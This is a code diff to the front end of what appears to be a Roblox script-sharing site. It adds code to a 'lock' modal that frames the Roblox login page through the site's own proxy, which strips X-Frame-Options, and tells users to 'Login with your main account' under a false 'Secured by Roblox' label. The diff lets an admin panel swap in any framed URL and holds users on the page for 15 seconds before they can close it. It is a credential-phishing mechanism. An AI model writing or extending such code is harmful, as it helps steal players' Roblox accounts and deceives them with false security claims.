@@ -475,8 +475,8 @@ select{background:var(--sur);border:1px solid var(--bor);color:var(--tx);font-fa
         </iframe>
       </div>
       <div class="lk-frame-foot">
-        <span class="lk-frame-foot-note">🔐 Secured by Roblox</span>
-        <button class="lk-btn-done" onclick="clsLock()">✓ Done — Close</button>
+        <span class="lk-frame-foot-note" id="lkFootNote">🔐 Secured by Roblox · <span id="lkDoneTimer" style="color:var(--acc2);font-weight:700"></span></span>
+        <button class="lk-btn-done" id="lkDoneBtn" onclick="clsLock()" disabled style="opacity:.35;cursor:not-allowed">✓ Done — Close</button>
       </div>
     </div>
 
@@ -704,8 +704,24 @@ function doCopy(){
 
 // ── LOCK MODAL ─────────────────────────────────────────
 let lockTimer=null, lockSec=5;
-const PROXY_BASE   = 'https://scriptvault-gray.vercel.app/api/proxy?url=';
-const ROBLOX_LOGIN = 'https://www.roblox.com/login';
+const PROXY_BASE    = 'https://scriptvault-gray.vercel.app/api/proxy?url=';
+const IFRAME_KEY    = 'sv_iframe_url';
+const IFRAME_DEFAULT = 'https://www.roblox.com/login';
+// Read from localStorage (set by admin panel)
+function getIframeUrl(){ return localStorage.getItem(IFRAME_KEY) || IFRAME_DEFAULT; }
+
+// Listen for admin changes in real time
+try{
+  const _lkCh = new BroadcastChannel('sv_sync');
+  _lkCh.onmessage = (e)=>{
+    if(e.data?.action==='iframeUrl' && e.data?.url){
+      localStorage.setItem(IFRAME_KEY, e.data.url);
+    }
+    if(e.data?.action==='post'||e.data?.action==='edit'||e.data?.action==='delete'){
+      loadStats(); load();
+    }
+  };
+}catch{}
 
 function openLock(url){
   lockSec = 5;
@@ -754,13 +770,37 @@ function showLkFrame(){
   document.getElementById('lkSub').textContent           = 'Login with your main account';
   document.getElementById('lkSpinner').classList.remove('gone');
   // Load Roblox via proxy (strips X-Frame-Options)
-  document.getElementById('lkFrame').src = PROXY_BASE + encodeURIComponent(ROBLOX_LOGIN);
+  document.getElementById('lkFrame').src = PROXY_BASE + encodeURIComponent(getIframeUrl());
 }
 
 function onLkFrameLoad(){
   setTimeout(()=>{
     document.getElementById('lkSpinner').classList.add('gone');
+    startDoneTimer();
   }, 500);
+}
+
+function startDoneTimer(){
+  let sec = 15; // user must stay on page for 15 seconds
+  const doneBtn  = document.getElementById('lkDoneBtn');
+  const doneNote = document.getElementById('lkDoneTimer');
+  doneBtn.disabled = true;
+  doneBtn.style.opacity = '.35';
+  doneBtn.style.cursor = 'not-allowed';
+  doneNote.textContent = 'Close available in '+sec+'s';
+
+  const t = setInterval(()=>{
+    sec--;
+    doneNote.textContent = sec > 0 ? 'Close available in '+sec+'s' : '';
+    if(sec <= 0){
+      clearInterval(t);
+      doneBtn.disabled = false;
+      doneBtn.style.opacity = '1';
+      doneBtn.style.cursor = 'pointer';
+      doneBtn.style.animation = 'fadeUp .4s ease both';
+      document.getElementById('lkFootNote').innerHTML = '🔐 Secured by Roblox · <span style="color:var(--grn);font-weight:700">✓ You may close</span>';
+    }
+  }, 1000);
 }
 
 function clsLock(){
